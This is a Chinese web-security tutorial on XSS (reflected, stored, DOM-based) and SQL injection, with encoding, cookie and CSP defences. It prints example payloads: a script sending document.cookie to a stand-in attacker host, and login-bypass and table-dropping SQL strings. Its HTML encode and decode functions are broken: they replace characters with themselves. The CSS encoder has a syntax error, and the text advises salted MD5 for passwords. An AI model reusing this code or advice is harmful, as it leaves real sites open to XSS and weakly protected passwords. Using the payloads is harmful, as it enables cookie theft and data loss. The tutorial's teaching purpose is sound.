## XSS攻击 介绍

XSS 即（Cross Site Scripting）中文名称为：跨站脚本攻击。XSS的重点不在于跨站点，而在于脚本的执行。

原理：恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。那么XSS攻击最主要有如下分类：反射型、存储型、及 DOM-based型。 反射性和DOM-baseed型可以归类为非持久性XSS攻击。存储型可以归类为持久性XSS攻击。

## 危害

- 窃取网页浏览中的cookie值
- 劫持流量实现恶意跳转

## 反射型XSS

反射性XSS的原理是：反射性xss一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。

反射性XSS又可以叫做非持久性XSS。为什么叫反射型XSS呢？那是因为这种攻击方式的注入代码是从目标服务器通过错误信息，搜索结果等方式反射回来的，而为什么又叫非持久性XSS呢？那是因为这种攻击方式只有一次性。

比如：攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接的时候，注入脚本被传输到目标服务器上，然后服务器将注入脚本 "反射"到受害者的浏览器上，从而浏览器就执行了该脚本。

因此反射型XSS的攻击步骤如下：

1. 攻击者在url后面的参数中加入恶意攻击代码。
2. 当用户打开带有恶意代码的URL的时候，网站服务端将恶意代码从URL中取出，拼接在html中并且返回给浏览器端。
3. 用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。
4. 攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。攻击者会获取到比如cookie等信息，然后使用该信息来冒充合法用户
的行为，调用目标网站接口执行攻击等操作。

常见类型：如恶意链接。

## 存储型XSS

存储型XSS的原理是：主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。

比如一个博客网站，攻击者在上面发布了一篇文章，内容是如下：<script>window.open("www.gongji.com?param="+document.cookie)</script> 如果没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。

因此存储型XSS的攻击步骤如下：

1. 攻击者将恶意代码提交到目标网站数据库中。
2. 用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到html中返回给浏览器中。
3. 用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。
4. 那么恶意代码执行后，就能获取到用户数据，比如上面的cookie等信息，那么把该cookie发送到攻击者网站中，那么攻击者拿到该
cookie然后会冒充该用户的行为，调用目标网站接口等违法操作。

防范：

1. 后端需要对提交的数据进行过滤。
2. 前端也可以做一下处理方式，比如对script标签，将特殊字符替换成HTML编码这些等。

## DOM-based型XSS

我们客户端的js可以对页面dom节点进行动态的操作，比如插入、修改页面的内容。比如说客户端从URL中提取数据并且在本地执行、如果用户在客户端输入的数据包含了恶意的js脚本的话，但是这些脚本又没有做任何过滤处理的话，那么我们的应用程序就有可能受到DOM-based XSS的攻击。因此DOM型XSS的攻击步骤如下：

1. 攻击者构造出特殊的URL、在其中可能包含恶意代码。
2. 用户打开带有恶意代码的URL。
3. 用户浏览器收到响应后解析执行。前端使用js取出url中的恶意代码并执行。
4. 执行时，恶意代码窃取用户数据并发送到攻击者的网站中，那么攻击者网站拿到这些数据去冒充用户的行为操作。调用目标网站接口
执行攻击者一些操作。

DOM XSS 是基于文档对象模型的XSS。一般有如下DOM操作：

1. 使用document.write直接输出数据。
2. 使用innerHTML直接输出数据。
3. 使用location、location.href、location.replace、iframe.src、document.referer、window.name等这些。

```
<script>
  document.body.innerHTML = "<a href='"+url+"'>"+url+"</a>";
</script>
```

假如对于变量url的值是：javascript:alert('dom-xss'); 类似这样的，那么就会收到xss的攻击了。因此对于DOM XSS主要是由于本地客户端获取的DOM数据在本地执行导致的。因此我们需要对HTML进行编码，对JS进行编码来防止这些问题产生。

## SQL注入

SQL注入是通过客户端的输入把SQL命令注入到一个应用的数据库中，从而执行恶意的SQL语句。

什么意思呢？我们来打个比方：我们有一个登录框，需要输入用户名和密码对吧，然后我们的密码输入 'or '123' = '123 这样的。
我们在查询用户名和密码是否正确的时候，本来执行的sql语句是：select * from user where username = '' and password = ''. 这样的sql语句，现在我们输入密码是如上这样的，然后我们会通过参数进行拼接，拼接后的sql语句就是：
select * from user where username = '' and password = ' ' or '123' = '123 '; 这样的了，那么会有一个or语句，只要这两个有一个是正确的话，就条件成立，因此 123 = 123 是成立的。因此验证就会被跳过。这只是一个简单的列子，比如还有密码比如是这样的：'; drop table user;, 这样的话，那么sql命令就变成了：
select * from user where username = '' and password = ''; drop table user;' , 那么这个时候我们会把user表直接删除了。

sql被攻击的原因是：sql语句伪造参数，然后对参数进行拼接后形成xss攻击的sql语句。最后会导致数据库被攻击了。

防范方法：

1. 我们可以使用预编译语句(PreparedStatement，这样的话即使我们使用sql语句伪造成参数，到了服务端的时候，这个伪造sql语句的参数也只是简单的字符，并不能起到攻击的作用。
2. 数据库中密码不应明文存储的，可以对密码使用md5进行加密，为了加大破解成本，所以可以采用加盐的方式。

## 防御

### cookie安全策略

在服务器端设置cookie的时候设置 http-only, 这样就可以防止用户通过JS获取cookie。对cookie的读写或发送一般有如下字段进行设置：

- http-only: 只允许http或https请求读取cookie、JS代码是无法读取cookie的(document.cookie会显示http-only的cookie项被自动过滤掉)。发送请求时自动发送cookie.
- secure-only: 只允许https请求读取，发送请求时自动发送cookie。
- host-only: 只允许主机域名与domain设置完成一致的网站才能访问该cookie。

### X-XSS-Protection设置

HTTP X-XSS-Protection 响应头是 Internet Explorer，Chrome 和 Safari 的一个特性，当检测到跨站脚本攻击 (XSS (en-US))时，浏览器将停止加载页面。

该参数是设置在响应头中目的是用来防范XSS攻击的。它有如下几种配置：
值有如下几种：默认为1.
0：禁用XSS保护。
1：启用XSS保护。
1;mode=block; 启用xss保护，并且在检查到XSS攻击是，停止渲染页面。

### XSS防御HTML编码

我们为什么要防御HTML编码呢？比如如下html代码：<div>content</div>,在div标签中存在一个输出变量{content}. 那么浏览器在解析的过程中，首先是html解析，当解析到div标签时，再解析 content的内容，然后会将页面显示出来。那假如该{content} 的值是 <script>alert('XSS攻击')</script> 这样的呢？因此该script脚本就会解析并且执行了，从而达到XSS的攻击目标。

因此我们需要将不可信数据放入到html标签内(比如div、span等)的时候需要进行html编码。
编码规则：将 & < > " ' / 转义为实体字符。如下基本转义代码：

```
// 使用正则表达式实现html编码
    function htmlEncodeByRegExp(str) {
      var s = '';
      if (str.length === 0) {
        return s;
      }
      return (s + str)
        .replace(/&/g, "&")
        .replace(/</g, "<")
        .replace(/>/g, ">")
        .replace(/ /g, " ")
        .replace(/\'/g, "&#39")
        .replace(/\"/g, """)
        .replace(/\//g, '&#x2F;');
    }
    // 使用正则表达式实现html解码
    function htmlDecodeByRegExp(str) {
      var s = '';
      if (str.length === 0) {
        return s;
      }
      return (s + str)
        .replace(/&/g, "&")
        .replace(/</g, "<")
        .replace(/>/g, ">")
        .replace(/ /g, " ")
        .replace(/&#39/g, "\'")
        .replace(/"/g, "\"")
        .replace(/&#x2F;/g, "\/");
    }
```

### XSS 防御HTML Attribute编码

和HTML编码一样，html中的属性也要进行编码，比如 <input name="name"/>这样的，name是input的属性，因此在html解析时，会对name属性进行编码，因为假如{name} 的值为：" " onclick="alert('属性XSS')" " " 这样的，也就是说input变成这样的了，<input name=" " onclick="alert('属性XSS')" " "></input>，input属性name被插入onclick事件了，因此也需要针对这种常规的html属性，都需要对其进行HTML属性编码。

因此我们需要将不可信数据放入html属性时(不含src、href、style 和 事件处理函数(onclick, onmouseover等))。需要进行HTML Attribute 编码。
编码规则：除了字母、数字、字符以外，使用 &#x;16进制格式来转义ASCII值小于256所有的字符。
```
function encodeForHTMLAttibute(str) {
    let encoded = '';
    for(let i = 0; i < str.length; i++) {
        let ch = hex = str[i];
        if (!/[A-Za-z0-9]/.test(str[i]) && str.charCodeAt(i) < 256) {
          hex = '&#x' + ch.charCodeAt(0).toString(16) + ';';
        }
        encoded += hex;
    }
    return encoded;
};
```

### XSS防御之javascript编码

在上面的 XSS 防御HTML Attribute编码中我们是可以防御XSS攻击，但是它只能防御的是HTML通用属性，并不是全部属性，在html中还存在很多支持协议解析的html属性，比如 onclick, onerror, href, src 等这些，类似这些属性我们是无法通过HTML编码来防范XSS攻击的。因为浏览器会先解析html编码的字符，将其转换为该属性的值，但是该属性本身支持JS代码执行，因此游览器在HTML解码后，对该属性的值进行JS解析，因此会执行响应的代码。

比如如下代码：<a href="javascript:alert('href xss')" target="_blank">href xss</a> 是可以点击的。 如果我们对该进行html属性编码一下，还是可以点击的，
如代码：<a href="javascript&#x3a;alert&#x28;&#x27;href&#x20;xss&#x20;HTML编码无效&#x27;&#x29;" target="_blank">href xss HTML属性编码无效</a> 页面还是可以点击的。

```
var str = "javascript:alert('href xss')";
// 使用正则表达式实现html编码
function encodeForHTMLAttibute(str) {
  let encoded = '';
  for(let i = 0; i < str.length; i++) {
    let ch = hex = str[i];
    if (!/[A-Za-z0-9]/.test(str[i]) && str.charCodeAt(i) < 256) {
      hex = '&#x' + ch.charCodeAt(0).toString(16) + ';';
    }
    encoded += hex;
  }
  return encoded;
};
console.log(encodeForHTMLAttibute(str)); // javascript&#x3a;alert&#x28;&#x27;href&#x20;xss&#x27;&#x29;
```

### XSS 防御之 URL 编码

作用范围：将不可信数据作为 URL 参数值时需要对参数进行 URL 编码
编码规则：**将参数值进行 encodeURIComponent 编码**

```
function encodeForURL(str){
  return encodeURIComponent(str);
};
```

### XSS 防御之 CSS 编码

作用范围：将不可信数据作为 CSS 时进行 CSS 编码
比如：通过css构造（background-img:url\expression\link-href@import）

编码规则：除了字母数字字符以外，使用\XXXXXX格式来转义ASCII值小于256的所有字符。 编码代码如下：
```
function encodeForCSS (attr, str){
  let encoded = '';
  for (let i = 0; i < str.length; i++) {
    let ch = str.charAt(i);
    if (!ch.match(/[a-zA-Z0-9]/) {
      let hex = str.charCodeAt(i).toString(16);
      let pad = '000000'.substr((hex.length));
      encoded += '\\' + pad + hex;
    } else {
      encoded += ch;
    }
  }
  return encoded;
};
```

### 开启CSP网页安全政策防止XSS攻击

Content-Security-Policy 中文的意思是 网页安全政策，

CSP是网页安全政策(Content Security Policy)的缩写。主要用来防止XSS攻击。是一种由开发者定义的安全性政策申明，通过CSP所约束的责任指定可信的内容来源，通过 Content-Security-Policy 网页的开发者可以控制整个页面中 外部资源 的加载和执行。
比如可以控制哪些 域名下的静态资源可以被页面加载，哪些不能被加载。这样就可以很大程度的防范了 来自 跨站(域名不同) 的脚本攻击。

我们只需要在meta属性中设置下即可：如下代码：
```
<meta http-equiv="Content-Security-Policy" content="">
```
